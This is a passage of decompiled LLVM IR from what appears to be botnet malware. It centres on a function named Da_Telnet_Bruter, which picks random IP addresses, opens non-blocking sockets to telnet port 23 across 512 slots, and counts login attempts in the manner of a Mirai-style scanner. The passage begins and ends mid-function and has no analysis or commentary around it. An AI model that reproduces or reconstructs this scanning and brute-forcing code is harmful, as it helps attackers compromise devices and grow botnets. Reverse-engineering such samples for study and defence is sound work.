  %v3_e77c = add i32 %tmp4, 6
  %v4_e77c = inttoptr i32 %v3_e77c to i8*
  store i8 0, i8* %v4_e77c, align 1
  %v0_e780 = load i32, i32* %r3.global-to-local, align 4
  %v1_e780 = trunc i32 %v0_e780 to i8
  %v2_e780 = load i32, i32* %r2.global-to-local, align 4
  %v3_e780 = add i32 %v2_e780, 7
  %v4_e780 = inttoptr i32 %v3_e780 to i8*
  store i8 %v1_e780, i8* %v4_e780, align 1
  %v3_e78c = add i32 %tmp4, 8
  %v4_e78c = inttoptr i32 %v3_e78c to i8*
  store i8 -1, i8* %v4_e78c, align 1
  %v3_e798 = add i32 %tmp4, 9
  %v4_e798 = inttoptr i32 %v3_e798 to i8*
  store i8 %tmp, i8* %v4_e798, align 1
  store i32 %tmp4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_e7a4 = add i32 %tmp4, 10
  %v4_e7a4 = inttoptr i32 %v3_e7a4 to i8*
  store i8 0, i8* %v4_e7a4, align 1
  %v0_e7a8 = load i32, i32* %r3.global-to-local, align 4
  %v1_e7a8 = trunc i32 %v0_e7a8 to i8
  %v2_e7a8 = load i32, i32* %r2.global-to-local, align 4
  %v3_e7a8 = add i32 %v2_e7a8, 11
  %v4_e7a8 = inttoptr i32 %v3_e7a8 to i8*
  store i8 %v1_e7a8, i8* %v4_e7a8, align 1
  %v2_e7b4 = add i32 %tmp4, 12
  %v3_e7b4 = inttoptr i32 %v2_e7b4 to i32*
  store i32 %arg3, i32* %v3_e7b4, align 4
  store i32 %tmp4, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v2_e7c0 = add i32 %tmp4, 16
  %v3_e7c0 = inttoptr i32 %v2_e7c0 to i32*
  store i32 %arg2, i32* %v3_e7c0, align 4
  store i32 %v3_e6bc, i32* @fp, align 4
  ret i32 %v0_e754

; uselistorder directives
  uselistorder i32 %v0_e754, { 1, 2, 0 }
  uselistorder i32 %v3_e74c, { 1, 0 }
  uselistorder i32 %fold, { 1, 0 }
  uselistorder i32 %tmp4, { 1, 0, 2, 4, 3, 5, 6, 8, 7, 10, 9, 12, 11, 13, 14, 15 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32 %arg4, { 1, 0 }
}

define i32 @sclose(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v8_e7e8 = icmp sgt i32 %arg1, 2
  br i1 %v8_e7e8, label %dec_label_pc_e7f8, label %dec_label_pc_e808

dec_label_pc_e7f8:                                ; preds = %entry
  %v1_e7fc = call i32 @__libc_close(i32 %arg1)
  br label %dec_label_pc_e808

dec_label_pc_e808:                                ; preds = %entry, %dec_label_pc_e7f8
  %storemerge1 = phi i32 [ 0, %dec_label_pc_e7f8 ], [ 1, %entry ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder label %dec_label_pc_e808, { 1, 0 }
}

define i32 @Da_Telnet_Bruter(i32 %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-340 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-604 = alloca i32, align 4
  %stack_var_-612 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_e818 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_e818, i32* %ip.global-to-local, align 4
  %v3_e81c = load i32, i32* @r4, align 4
  store i32 %v3_e81c, i32* %stack_var_-24, align 4
  store i32 59428, i32* %stack_var_-4, align 4
  %v2_e820 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_e820, i32* @fp, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v2_e83c = call i32 @__GI_time(i32* null)
  store i32 %v2_e83c, i32* %r3.global-to-local, align 4
  store i32 %v2_e83c, i32* @r4, align 4
  %v0_e848 = call i32 @rand_cmwc()
  %v0_e850 = load i32, i32* @r4, align 4
  %v2_e850 = xor i32 %v0_e850, %v0_e848
  store i32 %v2_e850, i32* %r3.global-to-local, align 4
  %v1_e858 = call i32 @srand(i32 %v2_e850)
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-612, align 4
  %v1_e870 = call i32 @htons(i32 23)
  %v2_e888 = ptrtoint i32* %stack_var_-604 to i32
  store i32 %v2_e888, i32* %r2.global-to-local, align 4
  store i32 0, i32* %stack_var_-604, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_e8a4 = call i32 @malloc(i32 513)
  store i32 513, i32* %r3.global-to-local, align 4
  store i32 513, i32* @r2, align 4
  %v2_e8cc = inttoptr i32 %v1_e8a4 to i8*
  %v3_e8cc = call i32 @__GI_memset(i8* %v2_e8cc, i32 0)
  %v1_e8f0 = load i32, i32* @sp, align 4
  %v1_e900 = add i32 %v1_e8f0, -14333
  %v3_e904 = and i32 %v1_e900, -4
  store i32 2560, i32* %r3.global-to-local, align 4
  store i32 2560, i32* @r2, align 4
  %v2_e93c = inttoptr i32 %v3_e904 to i8*
  %v3_e93c = call i32 @__GI_memset(i8* %v2_e93c, i32 0)
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_e94c

dec_label_pc_e94c:                                ; preds = %entry, %dec_label_pc_e94c
  %storemerge413 = phi i32 [ 0, %entry ], [ %v1_ea08, %dec_label_pc_e94c ]
  %v2_e95c = mul nuw nsw i32 %storemerge413, 28
  %v2_e960 = add i32 %v2_e95c, %v3_e904
  store i32 %v2_e960, i32* %r3.global-to-local, align 4
  %v2_e968 = inttoptr i32 %v2_e960 to i32*
  store i32 0, i32* %v2_e968, align 4
  %v0_e96c = load i32, i32* %r3.global-to-local, align 4
  %v1_e96c = add i32 %v0_e96c, 4
  store i32 %v1_e96c, i32* %r3.global-to-local, align 4
  %v2_e974 = inttoptr i32 %v1_e96c to i32*
  store i32 0, i32* %v2_e974, align 4
  %v0_e978 = load i32, i32* %r3.global-to-local, align 4
  %v1_e978 = add i32 %v0_e978, 4
  store i32 %v1_e978, i32* %r3.global-to-local, align 4
  %v2_e980 = inttoptr i32 %v1_e978 to i32*
  store i32 0, i32* %v2_e980, align 4
  %v0_e984 = load i32, i32* %r3.global-to-local, align 4
  %v1_e984 = add i32 %v0_e984, 4
  store i32 %v1_e984, i32* %r3.global-to-local, align 4
  %v2_e98c = inttoptr i32 %v1_e984 to i32*
  store i32 0, i32* %v2_e98c, align 4
  %v0_e990 = load i32, i32* %r3.global-to-local, align 4
  %v1_e990 = add i32 %v0_e990, 4
  store i32 %v1_e990, i32* %r3.global-to-local, align 4
  %v2_e998 = inttoptr i32 %v1_e990 to i32*
  store i32 0, i32* %v2_e998, align 4
  %v0_e99c = load i32, i32* %r3.global-to-local, align 4
  %v1_e99c = add i32 %v0_e99c, 4
  store i32 %v1_e99c, i32* %r3.global-to-local, align 4
  %v2_e9a4 = inttoptr i32 %v1_e99c to i32*
  store i32 0, i32* %v2_e9a4, align 4
  %v0_e9a8 = load i32, i32* %r3.global-to-local, align 4
  %v1_e9a8 = add i32 %v0_e9a8, 4
  %v2_e9b0 = inttoptr i32 %v1_e9a8 to i32*
  store i32 0, i32* %v2_e9b0, align 4
  %v3_e9d8 = add i32 %v2_e960, 9
  %v4_e9d8 = inttoptr i32 %v3_e9d8 to i8*
  store i8 1, i8* %v4_e9d8, align 1
  %v2_e9f8 = add i32 %v2_e960, 24
  %v2_ea00 = inttoptr i32 %v2_e9f8 to i32*
  store i32 %v1_e8a4, i32* %v2_ea00, align 4
  %v1_ea08 = add nuw nsw i32 %storemerge413, 1
  store i32 %v1_ea08, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v5_ea1c = icmp slt i32 %v1_ea08, 512
  br i1 %v5_ea1c, label %dec_label_pc_e94c, label %dec_label_pc_ea20.preheader

dec_label_pc_ea20.preheader:                      ; preds = %dec_label_pc_e94c
  %v19_e81c = ptrtoint i32* %stack_var_-24 to i32
  %v2_eaa8 = add i32 %v3_e904, 8
  %v2_ede0 = add i32 %v3_e904, 4
  %v3_eed0 = bitcast i32* %stack_var_-612 to %sockaddr*
  %v2_ef98 = ptrtoint i32* %stack_var_-328 to i32
  %v2_f098 = ptrtoint i32* %stack_var_-336 to i32
  %v2_f0f4 = ptrtoint i32* %stack_var_-200 to i32
  %v2_f0f8 = ptrtoint i32* %stack_var_-340 to i32
  %v2_f264 = add i32 %v3_e904, 24
  %v2_fc50 = add i32 %v3_e904, 16
  br label %dec_label_pc_ea20

dec_label_pc_ea20:                                ; preds = %dec_label_pc_ff2c, %dec_label_pc_ea20.preheader
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_ea2c

dec_label_pc_ea2c:                                ; preds = %dec_label_pc_ea20, %dec_label_pc_ff2c
  %storemerge511 = phi i32 [ 0, %dec_label_pc_ea20 ], [ %v1_ff30, %dec_label_pc_ff2c ]
  %v3_ea38 = mul i32 %storemerge511, 4
  store i32 %v3_ea38, i32* %r2.global-to-local, align 4
  %v2_ea40 = mul nuw nsw i32 %storemerge511, 28
  %v2_ea44 = add i32 %v2_ea40, %v3_e904
  %v2_ea48 = add i32 %v2_ea44, 16
  store i32 %v2_ea48, i32* %r3.global-to-local, align 4
  %v1_ea4c = inttoptr i32 %v2_ea48 to i32*
  %v2_ea4c = load i32, i32* %v1_ea4c, align 4
  store i32 %v2_ea4c, i32* %r3.global-to-local, align 4
  %v2_ea50 = icmp eq i32 %v2_ea4c, 0
  br i1 %v2_ea50, label %dec_label_pc_ea58, label %dec_label_pc_ea90

dec_label_pc_ea58:                                ; preds = %dec_label_pc_ea2c
  store i32 %storemerge511, i32* @r4, align 4
  %v2_ea60 = call i32 @__GI_time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_ea74 = load i32, i32* @r4, align 4
  %v3_ea78 = mul i32 %v0_ea74, 4
  store i32 %v3_ea78, i32* %r2.global-to-local, align 4
  %v2_ea80 = mul i32 %v0_ea74, 28
  %v2_ea88 = add i32 %v2_fc50, %v2_ea80
  store i32 %v2_ea88, i32* %r3.global-to-local, align 4
  %v2_ea8c = inttoptr i32 %v2_ea88 to i32*
  store i32 %v2_ea60, i32* %v2_ea8c, align 4
  br label %dec_label_pc_ea90

dec_label_pc_ea90:                                ; preds = %dec_label_pc_ea2c, %dec_label_pc_ea58
  store i32 %v3_ea38, i32* %r2.global-to-local, align 4
  %v2_eaac = add i32 %v2_eaa8, %v2_ea40
  store i32 %v2_eaac, i32* %r3.global-to-local, align 4
  %v1_eab0 = inttoptr i32 %v2_eaac to i8*
  %v2_eab0 = load i8, i8* %v1_eab0, align 4
  %v3_eab0 = sext i8 %v2_eab0 to i32
  %v4_eab0 = zext i8 %v2_eab0 to i32
  store i32 %v4_eab0, i32* %r3.global-to-local, align 4
  switch i32 %v3_eab0, label %dec_label_pc_ff2c [
    i32 0, label %dec_label_pc_eae4
    i32 1, label %dec_label_pc_efac.lr.ph
    i32 2, label %dec_label_pc_f3e4
    i32 3, label %dec_label_pc_f56c
    i32 4, label %dec_label_pc_f724
    i32 5, label %dec_label_pc_f8ac
    i32 6, label %dec_label_pc_fa64
    i32 7, label %dec_label_pc_fcc8
    i32 8, label %dec_label_pc_fd88
  ]

dec_label_pc_eae4:                                ; preds = %dec_label_pc_ea90
  store i32 %v3_ea38, i32* %r2.global-to-local, align 4
  %v2_eb00 = add i32 %v2_ea44, 8
  store i32 %v2_eb00, i32* %r3.global-to-local, align 4
  %v1_eb04 = add i32 %v2_ea44, 9
  %v2_eb04 = inttoptr i32 %v1_eb04 to i8*
  %v3_eb04 = load i8, i8* %v2_eb04, align 1
  %v7_eb08 = icmp eq i8 %v3_eb04, 1
  store i32 %storemerge511, i32* %r3.global-to-local, align 4
  br i1 %v7_eb08, label %dec_label_pc_eb10, label %dec_label_pc_ebfc

dec_label_pc_eb10:                                ; preds = %dec_label_pc_eae4
  store i32 %v3_ea38, i32* %r2.global-to-local, align 4
  %v2_eb2c = add i32 %v2_ea44, 24
  store i32 %v2_eb2c, i32* %r3.global-to-local, align 4
  %v1_eb30 = inttoptr i32 %v2_eb2c to i32*
  %v2_eb30 = load i32, i32* %v1_eb30, align 4
  store i32 %v2_ea44, i32* %r3.global-to-local, align 4
  %v2_eb54 = inttoptr i32 %v2_ea44 to i32*
  store i32 0, i32* %v2_eb54, align 4
  %v0_eb58 = load i32, i32* %r3.global-to-local, align 4
  %v1_eb58 = add i32 %v0_eb58, 4
  store i32 %v1_eb58, i32* %r3.global-to-local, align 4
  %v2_eb60 = inttoptr i32 %v1_eb58 to i32*
  store i32 0, i32* %v2_eb60, align 4
  %v0_eb64 = load i32, i32* %r3.global-to-local, align 4
  %v1_eb64 = add i32 %v0_eb64, 4
  store i32 %v1_eb64, i32* %r3.global-to-local, align 4
  %v2_eb6c = inttoptr i32 %v1_eb64 to i32*
  store i32 0, i32* %v2_eb6c, align 4
  %v0_eb70 = load i32, i32* %r3.global-to-local, align 4
  %v1_eb70 = add i32 %v0_eb70, 4
  store i32 %v1_eb70, i32* %r3.global-to-local, align 4
  %v2_eb78 = inttoptr i32 %v1_eb70 to i32*
  store i32 0, i32* %v2_eb78, align 4
  %v0_eb7c = load i32, i32* %r3.global-to-local, align 4
  %v1_eb7c = add i32 %v0_eb7c, 4
  store i32 %v1_eb7c, i32* %r3.global-to-local, align 4
  %v2_eb84 = inttoptr i32 %v1_eb7c to i32*
  store i32 0, i32* %v2_eb84, align 4
  %v0_eb88 = load i32, i32* %r3.global-to-local, align 4
  %v1_eb88 = add i32 %v0_eb88, 4
  store i32 %v1_eb88, i32* %r3.global-to-local, align 4
  %v2_eb90 = inttoptr i32 %v1_eb88 to i32*
  store i32 0, i32* %v2_eb90, align 4
  %v0_eb94 = load i32, i32* %r3.global-to-local, align 4
  %v1_eb94 = add i32 %v0_eb94, 4
  %v2_eb9c = inttoptr i32 %v1_eb94 to i32*
  store i32 0, i32* %v2_eb9c, align 4
  store i32 %v2_eb2c, i32* %r2.global-to-local, align 4
  store i32 %v2_eb30, i32* %r3.global-to-local, align 4
  store i32 %v2_eb30, i32* %v1_eb30, align 4
  store i32 %storemerge511, i32* @r4, align 4
  %v5_ebcc = call i32 @FindingRandomIP(i32 24, i32 %v3_e904, i32 %v2_eb2c, i32 %v2_eb30, i32 %v2_eb30)
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_ebdc = load i32, i32* @r4, align 4
  %v3_ebe0 = mul i32 %v0_ebdc, 4
  store i32 %v3_ebe0, i32* %r2.global-to-local, align 4
  %v2_ebe8 = mul i32 %v0_ebdc, 28
  %v2_ebf0 = add i32 %v2_ede0, %v2_ebe8
  store i32 %v2_ebf0, i32* %r3.global-to-local, align 4
  %v2_ebf4 = inttoptr i32 %v2_ebf0 to i32*
  store i32 %v5_ebcc, i32* %v2_ebf4, align 4
  br label %dec_label_pc_ed88

dec_label_pc_ebfc:                                ; preds = %dec_label_pc_eae4
  store i32 %v3_ea38, i32* %r2.global-to-local, align 4
  store i32 %v2_eb00, i32* %r3.global-to-local, align 4
  %v3_ec1c = load i8, i8* %v2_eb04, align 1
  %v4_ec1c = zext i8 %v3_ec1c to i32
  store i32 %v4_ec1c, i32* %r3.global-to-local, align 4
  %v2_ec20 = icmp eq i8 %v3_ec1c, 0
  br i1 %v2_ec20, label %dec_label_pc_ec28, label %dec_label_pc_ed88

dec_label_pc_ec28:                                ; preds = %dec_label_pc_ebfc
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 %v3_ea38, i32* %r2.global-to-local, align 4
  store i32 %v2_eb00, i32* %r3.global-to-local, align 4
  %v1_ec4c = add i32 %v2_ea44, 11
  %v2_ec4c = inttoptr i32 %v1_ec4c to i8*
  %v3_ec4c = load i8, i8* %v2_ec4c, align 1
  %v1_ec50 = add i8 %v3_ec4c, 1
  store i8 %v1_ec50, i8* %v2_ec4c, align 1
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 %v3_ea38, i32* %r2.global-to-local, align 4
  store i32 %v2_eb00, i32* %r3.global-to-local, align 4
  %v1_eca4 = add i32 %v2_ea44, 10
  %v2_eca4 = inttoptr i32 %v1_eca4 to i8*
  %v3_eca4 = load i8, i8* %v2_eca4, align 2
  %v1_eca8 = add i8 %v3_eca4, 1
  store i32 %v3_e904, i32* %ip.global-to-local, align 4
  store i8 %v1_eca8, i8* %v2_eca4, align 2
  store i32 %v3_ea38, i32* %r2.global-to-local, align 4
  store i32 %v2_eb00, i32* %r3.global-to-local, align 4
  %v3_ecf8 = load i8, i8* %v2_ec4c, align 1
  %v7_ecfc = icmp eq i8 %v3_ecf8, 14
  store i32 %v3_ea38, i32* %r2.global-to-local, align 4
  store i32 %v2_ea44, i32* %r3.global-to-local, align 4
  br i1 %v7_ecfc, label %dec_label_pc_ed04, label %dec_label_pc_ed30

dec_label_pc_ed04:                                ; preds = %dec_label_pc_ec28
  store i32 %v2_eb00, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i8 1, i8* %v2_eb04, align 1
  br label %dec_label_pc_ff2c

dec_label_pc_ed30:                                ; preds = %dec_label_pc_ec28
  store i32 %v2_eb00, i32* %r3.global-to-local, align 4
  %v3_ed50 = load i8, i8* %v2_eca4, align 2
  %v4_ed50 = zext i8 %v3_ed50 to i32
  store i32 %v4_ed50, i32* %r3.global-to-local, align 4
  %v7_ed54 = icmp eq i8 %v3_ed50, 14
  br i1 %v7_ed54, label %dec_label_pc_ed5c, label %dec_label_pc_ed88

dec_label_pc_ed5c:                                ; preds = %dec_label_pc_ed30
  store i32 %v2_eb00, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i8 1, i8* %v2_eb04, align 1
  br label %dec_label_pc_ff2c

dec_label_pc_ed88:                                ; preds = %dec_label_pc_ed30, %dec_label_pc_ebfc, %dec_label_pc_eb10
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-612, align 4
  %v1_ed9c = call i32 @htons(i32 23)
  store i32 0, i32* %stack_var_-604, align 4
  store i32 %v3_ea38, i32* %r2.global-to-local, align 4
  %v2_ede4 = add i32 %v2_ede0, %v2_ea40
  store i32 %v2_ede4, i32* %r3.global-to-local, align 4
  %v1_ede8 = inttoptr i32 %v2_ede4 to i32*
  %v2_ede8 = load i32, i32* %v1_ede8, align 4
  store i32 %v2_ede8, i32* %r3.global-to-local, align 4
  store i32 %storemerge511, i32* @r4, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_ee00 = call i32 @socket()
  %v0_ee08 = load i32, i32* @r4, align 4
  %v2_ee14 = mul i32 %v0_ee08, 28
  %v2_ee18 = add i32 %v2_ee14, %v3_e904
  %v2_ee1c = inttoptr i32 %v2_ee18 to i32*
  store i32 %v0_ee00, i32* %v2_ee1c, align 4
  store i32 %v3_ea38, i32* %r2.global-to-local, align 4
  store i32 %v2_ea44, i32* %r3.global-to-local, align 4
  %v1_ee38 = inttoptr i32 %v2_ea44 to i32*
  %v2_ee38 = load i32, i32* %v1_ee38, align 4
  store i32 %v2_ee38, i32* %r3.global-to-local, align 4
  %v7_ee3c = icmp eq i32 %v2_ee38, -1
  br i1 %v7_ee3c, label %dec_label_pc_ff2c, label %dec_label_pc_ee44

dec_label_pc_ee44:                                ; preds = %dec_label_pc_ed88
  store i32 %v3_ea38, i32* %r2.global-to-local, align 4
  store i32 %v2_ea44, i32* %r3.global-to-local, align 4
  %v2_ee5c = load i32, i32* %v1_ee38, align 4
  store i32 %v2_ee5c, i32* @r4, align 4
  store i32 %v3_ea38, i32* %r2.global-to-local, align 4
  store i32 %v2_ea44, i32* %r3.global-to-local, align 4
  %v2_ee78 = load i32, i32* %v1_ee38, align 4
  store i32 %v2_ee78, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  %v2_ee88 = call i32 @__libc_fcntl(i32 %v2_ee78, i32 3)
  %v1_ee90 = or i32 %v2_ee88, 2048
  store i32 %v1_ee90, i32* %r3.global-to-local, align 4
  %v0_ee94 = load i32, i32* @r4, align 4
  store i32 %v1_ee90, i32* @r2, align 4
  %v2_eea0 = call i32 @__libc_fcntl(i32 %v0_ee94, i32 4)
  store i32 %v3_ea38, i32* %r2.global-to-local, align 4
  store i32 %v2_ea44, i32* %r3.global-to-local, align 4
  %v2_eebc = load i32, i32* %v1_ee38, align 4
  store i32 %v2_eebc, i32* %r3.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v4_eed0 = call i32 @__libc_connect(i32 %v2_eebc, %sockaddr* nonnull %v3_eed0, i32 16)
  store i32 %v4_eed0, i32* %r3.global-to-local, align 4
  %v3_eed8 = icmp eq i32 %v4_eed0, -1
  br i1 %v3_eed8, label %dec_label_pc_eee0, label %dec_label_pc_ef44

dec_label_pc_eee0:                                ; preds = %dec_label_pc_ee44
  %v0_eee0 = call i32 @__errno_location()
  store i32 %v0_eee0, i32* %r3.global-to-local, align 4
  %v1_eee8 = inttoptr i32 %v0_eee0 to i32*
  %v2_eee8 = load i32, i32* %v1_eee8, align 4
  store i32 %v2_eee8, i32* %r3.global-to-local, align 4
  %v7_eeec = icmp eq i32 %v2_eee8, 115
  br i1 %v7_eeec, label %dec_label_pc_ef44, label %dec_label_pc_eef4

dec_label_pc_eef4:                                ; preds = %dec_label_pc_eee0
  store i32 %v3_ea38, i32* %r2.global-to-local, align 4
  store i32 %v2_ea44, i32* %r3.global-to-local, align 4
  %v2_ef0c = load i32, i32* %v1_ee38, align 4
  store i32 %v2_ef0c, i32* %r3.global-to-local, align 4
  %v3_ef14 = call i32 @sclose(i32 %v2_ef0c, i32 %v3_e904, i32 %v3_ea38)
  store i32 %v2_eb00, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i8 1, i8* %v2_eb04, align 1
  br label %dec_label_pc_ff2c

dec_label_pc_ef44:                                ; preds = %dec_label_pc_ee44, %dec_label_pc_eee0
  %v3_ef68 = inttoptr i32 %v2_eb00 to i8*
  store i8 1, i8* %v3_ef68, align 4
  store i32 %v2_ea48, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %v1_ea4c, align 4
  br label %dec_label_pc_ff2c

dec_label_pc_efac.lr.ph:                          ; preds = %dec_label_pc_ea90
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_efac

dec_label_pc_efac:                                ; preds = %dec_label_pc_efac.lr.ph, %dec_label_pc_efac
  %storemerge610 = phi i32 [ 0, %dec_label_pc_efac.lr.ph ], [ %v1_efc0, %dec_label_pc_efac ]
  store i32 %v2_ef98, i32* %r2.global-to-local, align 4
  %v5_efb8 = mul nuw nsw i32 %storemerge610, 4
  %v6_efb8 = add i32 %v5_efb8, %v2_ef98
  %v7_efb8 = inttoptr i32 %v6_efb8 to i32*
  store i32 0, i32* %v7_efb8, align 4
  %v1_efc0 = add nuw nsw i32 %storemerge610, 1
  store i32 %v1_efc0, i32* %r3.global-to-local, align 4
  %tmp45 = icmp ult i32 %v1_efc0, 32
  br i1 %tmp45, label %dec_label_pc_efac, label %dec_label_pc_efd4

dec_label_pc_efd4:                                ; preds = %dec_label_pc_efac
  store i32 %v3_ea38, i32* %r2.global-to-local, align 4
  store i32 %v2_ea44, i32* %r3.global-to-local, align 4
  %v1_efec = inttoptr i32 %v2_ea44 to i32*
  %v2_efec = load i32, i32* %v1_efec, align 4
  %v3_eff0 = udiv i32 %v2_efec, 32
  %v3_f004 = mul nuw nsw i32 %v3_eff0, 4
  %v2_f00c = add i32 %v3_f004, %v19_e81c
  store i32 %v2_f00c, i32* %r2.global-to-local, align 4
  %v2_f010 = add i32 %v2_f00c, -304
  store i32 %v2_f010, i32* %r3.global-to-local, align 4
  %v1_f014 = inttoptr i32 %v2_f010 to i32*
  %v2_f014 = load i32, i32* %v1_f014, align 4
  store i32 %v2_f014, i32* %ip.global-to-local, align 4
  store i32 %v3_ea38, i32* %r2.global-to-local, align 4
  store i32 %v2_ea44, i32* %r3.global-to-local, align 4
  %v2_f030 = load i32, i32* %v1_efec, align 4
  %v1_f034 = urem i32 %v2_f030, 32
  %v6_f03c = shl i32 1, %v1_f034
  %v2_f040 = or i32 %v6_f03c, %v2_f014
  store i32 %v2_f040, i32* %v1_f014, align 4
  store i32 0, i32* %stack_var_-336, align 4
  store i32 %v3_ea38, i32* %r2.global-to-local, align 4
  store i32 %v2_ea44, i32* %r3.global-to-local, align 4
  %v2_f08c = load i32, i32* %v1_efec, align 4
  %v1_f090 = add i32 %v2_f08c, 1
  store i32 %v1_f090, i32* %r2.global-to-local, align 4
  store i32 %v2_ef98, i32* %ip.global-to-local, align 4
  %v1_f09c = load i32, i32* @sp, align 4
  %v2_f09c = inttoptr i32 %v1_f09c to i32*
  store i32 %v2_f098, i32* %v2_f09c, align 4
  %v0_f0a0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_ef98, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_f0b0 = load i32, i32* %stack_var_-336, align 4
  %v5_f0b0 = call i32 @__libc_select(i32 %v0_f0a0, i32 0, i32 %v2_ef98, i32 0, i32 %v4_f0b0)
  store i32 %v5_f0b0, i32* %r3.global-to-local, align 4
  %v7_f0c0 = icmp eq i32 %v5_f0b0, 1
  br i1 %v7_f0c0, label %dec_label_pc_f0c8, label %dec_label_pc_f2ac

dec_label_pc_f0c8:                                ; preds = %dec_label_pc_efd4
  store i32 4, i32* %stack_var_-340, align 4
  store i32 0, i32* %stack_var_-200, align 4
  store i32 %v3_ea38, i32* %r2.global-to-local, align 4
  store i32 %v2_ea44, i32* %r3.global-to-local, align 4
  %v2_f0f0 = load i32, i32* %v1_efec, align 4
  store i32 %v2_f0f0, i32* %r2.global-to-local, align 4
  store i32 %v2_f0f4, i32* %ip.global-to-local, align 4
  %v1_f0fc = load i32, i32* @sp, align 4
  %v2_f0fc = inttoptr i32 %v1_f0fc to i32*
  store i32 %v2_f0f8, i32* %v2_f0fc, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 %v2_f0f4, i32* %r3.global-to-local, align 4
  %v0_f110 = call i32 @getsockopt()
  %v3_f114 = load i32, i32* %stack_var_-200, align 4
  %v2_f118 = icmp eq i32 %v3_f114, 0
  store i32 %v3_ea38, i32* %r2.global-to-local, align 4
  store i32 %v2_ea44, i32* %r3.global-to-local, align 4
  %v2_f1b0 = load i32, i32* %v1_efec, align 4
  br i1 %v2_f118, label %dec_label_pc_f198, label %dec_label_pc_f120

dec_label_pc_f120:                                ; preds = %dec_label_pc_f0c8
  store i32 %v2_f1b0, i32* %r3.global-to-local, align 4
  %v3_f140 = call i32 @sclose(i32 %v2_f1b0, i32 %v3_e904, i32 %v3_ea38)
  %v2_f160 = add i32 %v2_ea44, 8
  %v3_f168 = inttoptr i32 %v2_f160 to i8*
  store i8 0, i8* %v3_f168, align 4
  store i32 %v2_f160, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_f190 = add i32 %v2_ea44, 9
  %v4_f190 = inttoptr i32 %v3_f190 to i8*
  store i8 1, i8* %v4_f190, align 1
  br label %dec_label_pc_ff2c

dec_label_pc_f198:                                ; preds = %dec_label_pc_f0c8
  store i32 %v2_f1b0, i32* @r4, align 4
  store i32 %v3_ea38, i32* %r2.global-to-local, align 4
  store i32 %v2_ea44, i32* %r3.global-to-local, align 4
  %v2_f1cc = load i32, i32* %v1_efec, align 4
  store i32 %v2_f1cc, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  %v2_f1dc = call i32 @__libc_fcntl(i32 %v2_f1cc, i32 3)
  %v1_f1e4 = and i32 %v2_f1dc, -2049
  store i32 %v1_f1e4, i32* %r3.global-to-local, align 4
  %v0_f1e8 = load i32, i32* @r4, align 4
  store i32 %v1_f1e4, i32* @r2, align 4
  %v2_f1f4 = call i32 @__libc_fcntl(i32 %v0_f1e8, i32 4)
  store i32 0, i32* %v1_ea4c, align 4
  %v2_f23c = add i32 %v2_ea44, 20
  store i32 %v2_f23c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_f244 = inttoptr i32 %v2_f23c to i8*
  store i8 0, i8* %v3_f244, align 4
  %v0_f248 = load i32, i32* %r3.global-to-local, align 4
  %v1_f248 = trunc i32 %v0_f248 to i8
  %v2_f248 = load i32, i32* %r2.global-to-local, align 4
  %v3_f248 = add i32 %v2_f248, 1
  %v4_f248 = inttoptr i32 %v3_f248 to i8*
  store i8 %v1_f248, i8* %v4_f248, align 1
  store i32 %v3_ea38, i32* %r2.global-to-local, align 4
  %v2_f268 = add i32 %v2_ea40, %v2_f264
  store i32 %v2_f268, i32* %r3.global-to-local, align 4
  %v1_f26c = inttoptr i32 %v2_f268 to i32*
  %v2_f26c = load i32, i32* %v1_f26c, align 4
  store i32 %v2_f26c, i32* %r3.global-to-local, align 4
  store i32 512, i32* @r2, align 4
  %v2_f27c = inttoptr i32 %v2_f26c to i8*
